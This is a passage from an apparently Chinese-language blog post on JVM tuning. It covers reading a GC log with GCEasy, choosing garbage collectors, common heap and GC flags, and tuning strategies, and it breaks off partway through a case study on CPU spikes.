sys=0.02, real=0.02 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:44.338-0800: 8.133: \\[GC (Allocation Failure) \\[PSYoungGen: 530400K-&gt;26083K(539648K)\\] 571997K-&gt;86488K(671744K), 0.0302789 secs\\] \\[Times: user=0.06 sys=0.02, real=0.03 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:45.800-0800: 9.595: \\[GC (Allocation Failure) \\[PSYoungGen: 539619K-&gt;32647K(733696K)\\] 600024K-&gt;99769K(865792K), 0.0280332 secs\\] \\[Times: user=0.04 sys=0.02, real=0.02 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:47.765-0800: 11.560: \\[GC (Allocation Failure) \\[PSYoungGen: 729479K-&gt;41445K(738304K)\\] 796601K-&gt;124936K(870400K), 0.0370655 secs\\] \\[Times: user=0.04 sys=0.02, real=0.04 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:49.620-0800: 13.415: \\[GC (Allocation Failure) \\[PSYoungGen: 738277K-&gt;26677K(974848K)\\] 821768K-&gt;114930K(1106944K), 0.0270382 secs\\] \\[Times: user=0.05 sys=0.02, real=0.02 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:52.146-0800: 15.942: \\[GC (Allocation Failure) \\[PSYoungGen: 959541K-&gt;17569K(985600K)\\] 1047794K-&gt;110447K(1117696K), 0.0274985 secs\\] \\[Times: user=0.05 sys=0.01, real=0.03 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:54.110-0800: 17.905: \\[GC (Allocation Failure) \\[PSYoungGen: 950433K-&gt;10240K(1236480K)\\] 1043311K-&gt;109662K(1368576K), 0.0146713 secs\\] \\[Times: user=0.05 sys=0.01, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:54.692-0800: 18.487: \\[GC (Metadata GC Threshold) \\[PSYoungGen: 264005K-&gt;3360K(1259520K)\\] 363427K-&gt;109573K(1391616K), 0.0086901 secs\\] \\[Times: user=0.03 sys=0.01, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:54.701-0800: 18.496: \\[Full GC (Metadata GC Threshold) \\[PSYoungGen: 3360K-&gt;0K(1259520K)\\] \\[ParOldGen: 106213K-&gt;54092K(208384K)\\] 109573K-&gt;54092K(1467904K), \\[Metaspace: 56204K-&gt;56204K(1101824K)\\], 0.1487173 secs\\] \\[Times: user=0.69 sys=0.01, real=0.14 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:57.787-0800: 21.583: \\[GC (Allocation Failure) \\[PSYoungGen: 1209856K-&gt;49146K(1321984K)\\] 1263948K-&gt;116260K(1530368K), 0.0339265 secs\\] \\[Times: user=0.05 sys=0.01, real=0.04 secs\\]   </span><br><span class=\"line\">2022-01-12T15:03:16.198-0800: 39.994: \\[GC (Allocation Failure) \\[PSYoungGen: 1321978K-&gt;29589K(1335296K)\\] 1389092K-&gt;101049K(1543680K), 0.0214759 secs\\] \\[Times: user=0.06 sys=0.01, real=0.03 secs\\]   </span><br><span class=\"line\">2022-01-12T15:03:19.021-0800: 42.816: \\[GC (GCLocker Initiated GC) \\[PSYoungGen: 1302421K-&gt;60915K(1280512K)\\] 1373881K-&gt;180735K(1488896K), 0.0482886 secs\\] \\[Times: user=0.08 sys=0.01, real=0.05 secs\\]   </span><br><span class=\"line\">2022-01-12T15:03:21.847-0800: 45.642: \\[GC (Allocation Failure) \\[PSYoungGen: 1280499K-&gt;89087K(1308672K)\\] 1400321K-&gt;228379K(1517056K), 0.0336500 secs\\] \\[Times: user=0.10 sys=0.01, real=0.04 secs\\]   </span><br><span class=\"line\">2022-01-12T15:03:24.516-0800: 48.311: \\[GC (Allocation Failure) \\[PSYoungGen: 1308671K-&gt;67295K(1257472K)\\] 1447963K-&gt;225652K(1465856K), 0.0381420 secs\\] \\[Times: user=0.07 sys=0.02, real=0.04 secs\\]  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"指标分析第二步：导入分析工具，尽心分析\"><a href=\"#指标分析第二步：导入分析工具，尽心分析\" class=\"headerlink\" title=\"指标分析第二步：导入分析工具，尽心分析\"></a>指标分析第二步：导入分析工具，尽心分析</h3><p>打开gceasy.io网站，并选择本地的gc文件，然后点击分析。</p>\n<p>（分析的速度根据日志的多少而定，可能会比较慢）</p>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/1.png\"><br>接下来看看分析结果：</p>\n<h3 id=\"JVM-memory-size-JVM内存大小\"><a href=\"#JVM-memory-size-JVM内存大小\" class=\"headerlink\" title=\"JVM memory size (JVM内存大小)\"></a>JVM memory size (JVM内存大小)</h3><p>GCEasy是一款非常好用的在线分析GC日志的工具，打开官网，直接上传gc日志，也可以更加上门的要求进行压缩上传。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/2.png\"><br>这里的Allocated和Peak分别表示可分配空间和峰值</p>\n<ul>\n<li><p><strong>Allocated</strong>：可分配空间大小。</p>\n<p><strong>具体含义如下</strong>：指示为每一代分配的大小。此数据点是从GC日志收集的，因此它可能与JVM系统属性指定的大小相匹配，也可能不匹配。假设您已将总堆大小配置为2gb，而在运行时，如果JVM只分配了1gb，那么在本报告中，您将看到分配的大小仅为1gb</p>\n</li>\n<li><p><strong>Peak：</strong> 分配的峰值。</p>\n<p><strong>具体含义如下</strong>：每一代的峰值内存利用率。通常它不会超过分配的大小。然而，在少数情况下，我们也看到峰值利用率超出了分配的大小，特别是在G1 GC中</p>\n</li>\n</ul>\n<p>JVM memory size ，GCEasy展示了年轻代、老年代、元空间。JVM给分配的大小和程序运行过程中使用的峰值大小。</p>\n<p>从JVM memory size展示的信息，我们可以判断是否需要做下面的几件事情。</p>\n<ul>\n<li><p>是否需要修改JVM内存（-Xms、-Xmx、-Xmn…）相关配置，比如年轻代和老年代峰值远远小于分配的大小，这个时候我们可以适当的减小内存设置。</p>\n</li>\n<li><p>是否需要调整年轻代和老年代的比例(-XX:NewSize(-Xns)、-XX:MaxNewSize(-Xmn)、-XX:SurvivorRatio&#x3D;8)。比如老年大的峰值一直小于老年代申请的内存，这个时候我们可以稍微多分点空间给年轻代。</p>\n</li>\n<li><p>是否需要修改元空间(XX:MetaspaceSize，-XX:MaxMetaspaceSize)相关设置。 <strong>年轻代，老年代属于堆区，元空间属于非堆区（直接对接的是机器的内存）</strong></p>\n</li>\n</ul>\n<h3 id=\"Key-Performance-Indicatiors（关键指标）\"><a href=\"#Key-Performance-Indicatiors（关键指标）\" class=\"headerlink\" title=\"Key Performance Indicatiors（关键指标）\"></a>Key Performance Indicatiors（关键指标）</h3><p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/3.png\"></p>\n<ul>\n<li><p>Throughput：吞吐量。</p>\n<p>指的是处理实际事务花费的时间与GC花费的时间的百分比。这个值越高越好</p>\n</li>\n<li><p>Latency：</p>\n<p>延迟情况。这里的延迟情况是指的GC过程花费的时间。具体含义如上图</p>\n</li>\n</ul>\n<p>Throughput表示的是吞吐量 Latency表示响应时间 Avg Pause GC Time 平均GC时间 Max Pause GC TIme 最大GC时间</p>\n<p>Key Performance Indicators 给我们展示了GC吞吐量（应用程序线程用时占程序总用时的比例，越高越好），每次GC的平均耗时（建议控制在50ms以下），GC最长耗时，每个时间段的GC次数及占比信息。</p>\n<p>通过Key Performance Indicators显示的信息里面，我们需要关注下面几个问题：</p>\n<ul>\n<li><p>吞吐量，应用花在非GC上的时间百分比（引用花在生产任务上的百分比）。所以吞吐量越高越好。</p>\n</li>\n<li><p>每次GC的平均耗时。越小越好，建议50ms以下。</p>\n</li>\n<li><p>GC最长耗时。越小越好。如果你的应用是一个后台程序，并且任何请求不超过10秒，那么GC最长耗时就不能超过10秒。</p>\n</li>\n</ul>\n<h3 id=\"Interactive-Graphs-交互图\"><a href=\"#Interactive-Graphs-交互图\" class=\"headerlink\" title=\"Interactive Graphs(交互图)\"></a>Interactive Graphs(交互图)</h3><p>Interactive Graphs 展示了</p>\n<p><strong>Heap after GC</strong>：GC之后堆的使用情况 <strong>Heap before GC</strong>：GC之前堆的使用情况 <strong>GC Duration</strong>：GC持续时间 <strong>Reclaimed Bytes</strong>：GC回收掉的垃圾对象的内存大小 <strong>Young Gen</strong>：年轻代堆的使用情况 <strong>Old Gen</strong>：老年代堆的使用情况 <strong>Meta Space</strong>：元空间的使用情况 <strong>A &amp; P</strong>：每次GC的时候堆内存分配和晋升情况。其中红色的线表示每次GC的时候年轻代里面有多少内存(对象)晋升到了老年代。</p>\n<p>第一部分是Heap after GC，GC后堆的内存图，堆是用来存储对象的，从图中可以看出，随着GC的进行，垃圾回收器把对象都回收掉了，因此堆的大小逐渐增大。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/4.png\"><br>第二部分是Heap before GC，这是GC前堆的使用率，可以看出随着程序的运行，堆使用率越来越高，堆被对象占用的内存越来越大。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/5.png\"><br>第三部分是GC Duration Time，就是GC持续时间。一个GC事件的发生具有多个阶段，而不同的垃圾回收器又有不同的阶段，这里展示不作细分。这些阶段（例如并发标记，并发清除等）与程序线程一起并发运行，此时不会暂停程序线程。但是某些阶段（例如初始标记，清除等）会暂停整个应用程序，所以此图标描述的仅暂停阶段所花费的时间。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/6.png\"><br>第四部分表示的是GC回收掉的垃圾对象的内存大小。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/7.png\"><br>第五部分表示的是Young Gen，年轻代的内存分配情况。对象都是朝生夕死，年轻代存放的就是刚刚产生的对象，每进行一次GC，都会GC掉很多垃圾对象，剩下的就是右GC Root关联的对象，这些对象会年龄会逐渐增加，达到了一定阈值就会晋升为老年代的对象。可以看到before GC表示的图线随着时间的进行逐渐增大，也就是年轻代中对象越来越多，而GC事件发生后，年轻代中对象就会减少，也就是after GC图线表示的内存变化趋势。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/8.png\"><br>第六部分是Old Gen，表示的是老年代的内存分配情况。细心的读者会发现，为啥一开始before GC的内存大小比after GC的内存分配要少呢？这里得先知道老年代存放的都是年龄大的对象，意思就是经过了多次GC都没有被GC掉的对象，就会晋升为老年代的对象。所以这就解释了为啥after GC内存要比before GC内存要大，因为每次GC过后，都会有年轻代的对象晋升为老年代对象。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/9.png\"><br>第七部分是每次GC的时候堆内存分配和晋升情况。其中红色的线表示每次GC的时候年轻代里面有多少内存(对象)晋升到了老年代。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/10.png\"></p>\n<h3 id=\"GC-Statistics-GC统计信息\"><a href=\"#GC-Statistics-GC统计信息\" class=\"headerlink\" title=\"GC Statistics(GC统计信息)\"></a>GC Statistics(GC统计信息)</h3><p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/11.png\"><br>每种GC总共回收了多少内存、总共用了多长时间、平均时间、以及每种GC的单独统计信息啥的。</p>\n<h3 id=\"Object-Stats-对象的一些统计信息\"><a href=\"#Object-Stats-对象的一些统计信息\" class=\"headerlink\" title=\"Object Stats(对象的一些统计信息)\"></a>Object Stats(对象的一些统计信息)</h3><p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/12.png\"></p>\n<h3 id=\"GC-Causes-GC的原因信息\"><a href=\"#GC-Causes-GC的原因信息\" class=\"headerlink\" title=\"GC Causes(GC的原因信息)\"></a>GC Causes(GC的原因信息)</h3><p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/13.png\"></p>\n<h3 id=\"Memory-Leak\"><a href=\"#Memory-Leak\" class=\"headerlink\" title=\"Memory Leak\"></a>Memory Leak</h3><p>由于记录的程序没有内存泄漏，所以这里就没有内存泄漏的日志信息。</p>\n<p>此处可以诊断8种OOM中的5种（Java堆内存溢出，超出GC开销限制，请求数组大小超过JVM限制，Permgen空间，元空间）。</p>\n<h2 id=\"四：JVM-常用配置策略\"><a href=\"#四：JVM-常用配置策略\" class=\"headerlink\" title=\"四：JVM 常用配置策略\"></a>四：JVM 常用配置策略</h2><h3 id=\"垃圾回收器的选择\"><a href=\"#垃圾回收器的选择\" class=\"headerlink\" title=\"垃圾回收器的选择\"></a>垃圾回收器的选择</h3><p>选择垃圾回收器时，应根据CPU核心数、关注点（吞吐量或用户停顿时间）以及JDK版本等因素做出合适的选择，以提高应用程序的性能和稳定性。</p>\n<ul>\n<li><p><strong>CPU单核：</strong></p>\n<p>当系统仅有单核CPU时，Serial垃圾收集器是最佳选择。</p>\n<p>由于单核系统的性能瓶颈主要集中在单一处理器上，使用Serial垃圾收集器能够简化垃圾回收的过程，提高系统的整体性能。</p>\n</li>\n<li><p><strong>CPU多核：关注吞吐量</strong></p>\n<p>对于多核CPU且关注系统吞吐量的情况，推荐选择Parallel Scavenge（PS）加 Parallel Old（PO）的组合。</p>\n<p>这种组合利用了多核CPU的并行处理能力，通过并行处理新生代和老年代的垃圾收集，以提高系统的吞吐量和整体性能。</p>\n</li>\n<li><p><strong>CPU多核，关注用户停顿时间，JDK版本1.6或1.7：</strong></p>\n<p>如果系统是多核CPU，并且更关注用户停顿时间，特别是在JDK版本为1.6或1.7的情况下，推荐选择Concurrent Mark-Sweep（CMS）垃圾收集器。</p>\n<p>CMS垃圾收集器以减少应用程序停顿时间为目标，通过与应用程序线程并发执行部分垃圾回收操作，从而降低了GC造成的停顿时间，提高了系统的响应速度和用户体验。</p>\n</li>\n<li><p><strong>CPU多核，关注用户停顿时间，JDK1.8及以上，JVM可用内存6G以上：</strong></p>\n<p>对于JDK版本为1.8及以上，并且系统具备充足的内存资源（6G及以上），且依然关注用户停顿时间的情况，推荐选择Garbage-First（G1）垃圾收集器。</p>\n<p>G1垃圾收集器是一种面向服务端应用的垃圾收集器，具有高效的垃圾回收、可预测的停顿时间和良好的内存整理能力，适用于对用户停顿时间有较高要求的应用场景。</p>\n</li>\n</ul>\n<p><strong>垃圾回收器的选择 的切换配置：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//设置Serial垃圾收集器（新生代）  </span><br><span class=\"line\"> 开启：-XX:+UseSerialGC  </span><br><span class=\"line\">   </span><br><span class=\"line\"> //设置PS+PO,新生代使用功能Parallel Scavenge 老年代将会使用Parallel Old收集器  </span><br><span class=\"line\"> 开启 -XX:+UseParallelOldGC  </span><br><span class=\"line\">   </span><br><span class=\"line\"> //CMS垃圾收集器（老年代）  </span><br><span class=\"line\"> 开启 -XX:+UseConcMarkSweepGC  </span><br><span class=\"line\">   </span><br><span class=\"line\"> //设置G1垃圾收集器  </span><br><span class=\"line\"> 开启 -XX:+UseG1GC  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"JVM参数常用原则\"><a href=\"#JVM参数常用原则\" class=\"headerlink\" title=\"JVM参数常用原则\"></a>JVM参数常用原则</h3><ul>\n<li><p>对于JVM堆的设置</p>\n<p>通常我们会使用 <strong>-Xms</strong> 和 <strong>-Xmx</strong> 来设定最小和最大堆大小，将它们设置为相同的值可以防止垃圾收集器在堆大小之间进行收缩，从而减少额外的时间消耗。</p>\n</li>\n<li><p>年轻代和年老代的大小将根据默认比例（通常为1：2）分配堆内存。</p>\n<p>我们可以通过调整 <strong>-XX:NewRatio</strong> 参数来调整它们之间的比例，</p>\n<p>也可以通过 <strong>-XX:NewSize</strong> 和 <strong>-XX:MaxNewSize</strong> 来设置年轻代的绝对大小。</p>\n<p>为了防止年轻代堆大小的调整，通常将 <strong>-XX:NewSize</strong> 和 <strong>-XX:MaxNewSize</strong> 设置为相同大小。</p>\n</li>\n<li><p>年轻代和年老代大小的合理设置没有标准答案，因此调优时需要观察它们大小变化对系统的影响。</p>\n<p>更大的年轻代会延长普通GC周期但增加每次GC的时间，而更小的年老代会导致更频繁的Full GC。</p>\n<p>选择应根据应用程序对象生命周期的分布情况，例如，如果应用存在大量的临时对象，则应选择更大的年轻代；如果存在大量的持久对象，则应适当增大年老代。</p>\n<p>观察应用一段时间后，根据峰值时年老代所占内存来调整年轻代的大小，但应保留年老代至少1&#x2F;3的增长空间。</p>\n</li>\n<li><p>在配置较好的机器上（如多核、大内存），可以为年老代选择并行收集算法，使用<strong>XX:+UseParallelOldGC</strong>，默认为串行收集。</p>\n</li>\n<li><p>线程堆栈的设置：每个线程默认会分配1M的堆栈空间，用于存放栈帧、调用参数、局部变量等。</p>\n<p>对于大多数应用来说，这个默认值过大，一般可以将其减小至256K。</p>\n<p>减小线程堆栈大小可以在内存不变的情况下创建更多线程，但这也受限于操作系统的支持。</p>\n</li>\n</ul>\n<h2 id=\"五：常见调优策略\"><a href=\"#五：常见调优策略\" class=\"headerlink\" title=\"五：常见调优策略\"></a>五：常见调优策略</h2><h3 id=\"5-1-调整内存大小\"><a href=\"#5-1-调整内存大小\" class=\"headerlink\" title=\"5.1 调整内存大小\"></a>5.1 调整内存大小</h3><ul>\n<li><p>现象：垃圾收集频率非常频繁</p>\n</li>\n<li><p>措施：考虑增加堆内存大小。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>频繁的垃圾收集通常是由于内存过小，导致需要不断进行垃圾收集以释放空间来容纳新对象。</p>\n<p>因此，增加堆内存大小可以显著降低垃圾收集的频率。</p>\n<p>需要注意的是，如果垃圾收集次数虽然频繁但每次回收的对象却很少，那么问题可能不在于内存过小，而是由于内存泄漏导致的对象无法被正确回收，从而引发了频繁的垃圾收集。</p>\n<p>在这种情况下，调整内存大小可能无法解决问题，而需要对代码进行进一步的分析和调试。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//设置堆初始值  </span><br><span class=\"line\">指令1：-Xms2g  </span><br><span class=\"line\">指令2：-XX:InitialHeapSize=2048m  </span><br><span class=\"line\">  </span><br><span class=\"line\">//设置堆区最大值  </span><br><span class=\"line\">指令1：\\`-Xmx2g\\`   </span><br><span class=\"line\">指令2： -XX:MaxHeapSize=2048m  </span><br><span class=\"line\">  </span><br><span class=\"line\">//新生代内存配置  </span><br><span class=\"line\">指令1：-Xmn512m  </span><br><span class=\"line\">指令2：-XX:MaxNewSize=512m</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-2-调整GC触发时机\"><a href=\"#5-2-调整GC触发时机\" class=\"headerlink\" title=\"5.2 调整GC触发时机\"></a>5.2 调整GC触发时机</h3><ul>\n<li><p>现象：</p>\n<p>在CMS和G1垃圾回收器下，频繁发生Full GC，导致程序严重卡顿。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>在G1和CMS的部分GC阶段是并发进行的，即业务线程和垃圾收集线程同时运行。</p>\n<p>这意味着在垃圾收集过程中，业务线程可能会生成新的对象。</p>\n<p>因此，在进行垃圾收集时，需要预留一部分内存空间来容纳新产生的对象。</p>\n<p>如果此时内存空间不足以容纳新对象，JVM会停止并发收集，暂停所有业务线程（STW），以确保垃圾收集正常进行。</p>\n<p>可以通过调整GC的触发时机（例如在老年代占用60%时触发GC）来预留足够的空间给业务线程创建的对象。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//使用多少比例的老年代后开始CMS收集，默认是68%，如果频繁发生SerialOld卡顿，应该调小  </span><br><span class=\"line\">-XX:CMSInitiatingOccupancyFraction  </span><br><span class=\"line\">  </span><br><span class=\"line\">//G1混合垃圾回收周期中要包括的旧区域设置占用率阈值。默认占用率为 65%  </span><br><span class=\"line\">-XX:G1MixedGCLiveThresholdPercent=65 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-3-调整对象晋升到老年代年龄阈值\"><a href=\"#5-3-调整对象晋升到老年代年龄阈值\" class=\"headerlink\" title=\"5.3 调整对象晋升到老年代年龄阈值\"></a>5.3 调整对象晋升到老年代年龄阈值</h3><ul>\n<li><p>现象：</p>\n<p>老年代发生频繁的GC，每次清理回收大量对象。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>当对象的晋升年龄设定较低时，新生代中的对象很快就会被晋升到老年代。</p>\n<p>这导致老年代中对象数量增多，其中很多对象实际上在短时间内就可能被回收。</p>\n<p>通过调整对象的晋升年龄，可以减少过早进入老年代的对象数量，从而减少老年代的空间压力和频繁的GC。</p>\n<p>注意：提高晋升年龄虽然可以减缓老年代的压力，但同时可能会增加新生代的GC频率，因为对象在新生代的停留时间变长。</p>\n<p>此外，新生代中频繁复制这些对象可能会导致新生代的GC时间也相应增长。</p>\n<p>在调整晋升年龄时，应综合考虑新生代和老年代的GC性能，以达到最优的系统性能平衡。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// 进入老年代最小的GC年龄,年轻代对象转换为老年代对象最小年龄值，默认值7  </span><br><span class=\"line\">-XX:InitialTenuringThreshol=7 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-4-调整大对象进入老年代的标准\"><a href=\"#5-4-调整大对象进入老年代的标准\" class=\"headerlink\" title=\"5.4 调整大对象进入老年代的标准\"></a>5.4 调整大对象进入老年代的标准</h3><ul>\n<li><p>现象：</p>\n<p>老年代经常发生频繁的GC，每次回收大量对象，而这些对象的体积都相对较大。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>大量大对象直接分配到老年代会快速填满老年代空间，导致老年代频繁GC。</p>\n<p>为解决此问题，可调整大对象直接进入老年代的标准。</p>\n<p>需要注意：将大对象调整为直接进入老年代后，可能会增加新生代的GC频率和时间。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//新生代可容纳的最大对象,大于则直接会分配到老年代，0代表没有限制。  </span><br><span class=\"line\"> -XX:PretenureSizeThreshold=1000000 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-5-调整内存区域大小比率\"><a href=\"#5-5-调整内存区域大小比率\" class=\"headerlink\" title=\"5.5 调整内存区域大小比率\"></a>5.5 调整内存区域大小比率</h3><ul>\n<li><p>现象：</p>\n<p>某一内存区域频繁发生GC，而其他区域的GC表现正常。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>频繁的GC可能是由于对应区域的空间不足所致，需要不断进行GC以释放空间。</p>\n<p>在JVM堆内存无法增加的情况下，可以考虑调整对应区域的大小比率。</p>\n<p>注意：尽管频繁的GC可能是由于空间不足造成的，但也有可能是因为内存泄漏导致内存无法回收，进而引发GC频繁。</p>\n<p>因此，在调整内存区域大小比率之前，需要仔细分析是否存在内存泄漏问题。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// survivor区和Eden区大小比率  </span><br><span class=\"line\">指令：-XX:SurvivorRatio=6  //S区和Eden区占新生代比率为1:6,两个S区2:6  </span><br><span class=\"line\">  </span><br><span class=\"line\">// 新生代和老年代的占比  </span><br><span class=\"line\">-XX:NewRatio=4  //表示新生代:老年代 = 1:4 即老年代占整个堆的4/5；默认值=2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-6-调整对象晋升至老年代的年龄阈值\"><a href=\"#5-6-调整对象晋升至老年代的年龄阈值\" class=\"headerlink\" title=\"5.6 调整对象晋升至老年代的年龄阈值\"></a>5.6 调整对象晋升至老年代的年龄阈值</h3><ul>\n<li><p>现象：</p>\n<p>老年代频繁进行GC，每次回收大量对象。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>如果对象的晋升年龄较小，新生代中的对象很快就会晋升至老年代，导致老年代中对象数量增多。</p>\n<p>然而，这些对象在接下来的短时间内可能会被回收。为解决老年代空间不足导致的频繁GC问题，可调整对象晋升至老年代的年龄阈值，使对象不那么容易晋升至老年代。</p>\n<p>注意：增加对象晋升年龄可能会导致新生代中对象的停留时间增加，从而增加新生代的GC频率，并且复制大对象可能导致新生代GC的时间延长。</p>\n<p>在调整晋升年龄时，需综合考虑新生代和老年代的GC性能，以获得最优的系统性能平衡。</p>\n<h3 id=\"5-7-调整垃圾回收的触发时机\"><a href=\"#5-7-调整垃圾回收的触发时机\" class=\"headerlink\" title=\"5.7 调整垃圾回收的触发时机\"></a>5.7 调整垃圾回收的触发时机</h3><ul>\n<li><p>现象：</p>\n<p>G1和CMS垃圾收集器在执行垃圾回收时与应用程序的业务线程并发工作。</p>\n<p>在垃圾回收过程中，业务线程可能生成新对象，需预留内存空间以容纳这些新产生的对象。</p>\n<p>若内存空间不足，JVM会暂停所有业务线程（STW）以确保垃圾回收正常进行。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>在进行垃圾回收时，若未预留足够的内存空间供新对象使用，可能导致内存压力过大，从而触发STW。</p>\n<p>通过调整垃圾回收的触发时机来预留足够的内存空间，如可设定在老年代占用达到一定比例时触发垃圾回收。</p>\n<p>这有助于提前释放内存空间，为新对象分配留出足够的空间，从而减少因内存不足而导致的STW情况。</p>\n<p>注意：</p>\n<p>提早触发垃圾回收会增加老年代垃圾回收的频率，这可能导致一些性能开销，如额外的CPU使用和系统停顿时间。</p>\n<p>因此，在调整垃圾回收的触发时机时，需要在性能与内存利用率之间找到恰当的平衡。</p>\n<h3 id=\"5-8-设置符合预期的停顿时间\"><a href=\"#5-8-设置符合预期的停顿时间\" class=\"headerlink\" title=\"5.8 设置符合预期的停顿时间\"></a>5.8 设置符合预期的停顿时间</h3><blockquote>\n<p><strong>现象</strong>： 程序间接性的卡顿 <strong>原因</strong>：如果没有确切的停顿时间设定，垃圾收集器以吞吐量为主，那么垃圾收集时间就会不稳定。 <strong>注意</strong>：不要设置不切实际的停顿时间，单次时间越短也意味着需要更多的GC次数才能回收完原有数量的垃圾.</p>\n</blockquote>\n<p>参数配置：l</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//GC停顿时间，垃圾收集器会尝试用各种手段达到这个时间  </span><br><span class=\"line\">     -XX:MaxGCPauseMillis </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"六：-JVM调优案例和实践\"><a href=\"#六：-JVM调优案例和实践\" class=\"headerlink\" title=\"六： JVM调优案例和实践\"></a>六： JVM调优案例和实践</h2><h3 id=\"案例1：网站流量增加后，网页响应速度变慢\"><a href=\"#案例1：网站流量增加后，网页响应速度变慢\" class=\"headerlink\" title=\"案例1：网站流量增加后，网页响应速度变慢\"></a>案例1：网站流量增加后，网页响应速度变慢</h3><p><strong>问题描述</strong> 在测试环境中，网站速度较快，但一到生产环境就显著变慢。 <strong>问题分析</strong></p>\n<ol>\n<li><p><strong>初步诊断</strong>： 通过使用 <strong>jstat -gc</strong> 指令监控线上JVM的GC活动，发现GC频率和所占时间异常高。这表明频繁的GC正影响业务线程的执行，从而导致页面响应缓慢。</p>\n</li>\n<li><p><strong>内存调整后的问题</strong>： 增加JVM的堆内存从2GB到16GB后，虽然常规请求的处理速度提高，但出现了间歇性的更长时间卡顿。进一步监控发现，虽然Full GC（FGC）的次数不多，但每次的持续时间过长，有时达到几十秒。</p>\n</li>\n<li><p><strong>原因推断</strong>： 增加堆内存后，虽然减少了频繁的垃圾回收，但因为PS+PO垃圾收集器（Parallel Scavenge + Parallel Old）在垃圾标记和收集阶段都需要停止所有工作线程（STW），所以每次GC时业务线程的停顿时间显著增长。</p>\n</li>\n</ol>\n<p><strong>解决方案</strong></p>\n<ol>\n<li><p><strong>调整垃圾收集器</strong>： 服务不稳定的根本问题是垃圾回收过程中的停顿时间过长，由于默认的PS+PO组合垃圾收集器导致。为了解决这一问题，可更换为并发类的收集器，如CMS垃圾收集器。</p>\n</li>\n<li><p><strong>CMS配置优化</strong>： 根据系统运行的实际情况，调整CMS的启动阈值，预设了合理的停顿时间，以确保不会因为内存回收而影响用户的使用体验。</p>\n</li>\n</ol>\n<h3 id=\"案例2：CPU飙升和GC频繁的调优实践\"><a href=\"#案例2：CPU飙升和GC频繁的调优实践\" class=\"headerlink\" title=\"案例2：CPU飙升和GC频繁的调优实践\"></a>案例2：CPU飙升和GC频繁的调优实践</h3><p><strong>问题描述：</strong> 随着在线游戏玩家数量的增加，系统出现CPU飙升和GC频繁的情况，导致游戏体验下降。 <strong>问题分析：</strong> 使用监控工具检查系统的CPU使用情况和GC情况，发现系统在高负载情况下CPU占用过高，且GC频率过于频繁。 